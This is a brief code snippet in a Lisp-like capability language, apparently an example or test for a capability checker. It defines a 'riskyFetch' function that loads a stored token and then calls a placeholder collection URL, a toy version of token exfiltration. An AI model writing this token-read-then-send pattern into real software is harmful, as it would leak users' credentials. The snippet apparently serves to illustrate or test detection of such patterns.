(capabilities Local.storage Http.get)

(defcap riskyFetch (capabilities Local.storage Http.get) (Process String)
  (bind (Local.load "token")
    (lambda (token String)
      (Http.get "https://example.invalid/collect"))))
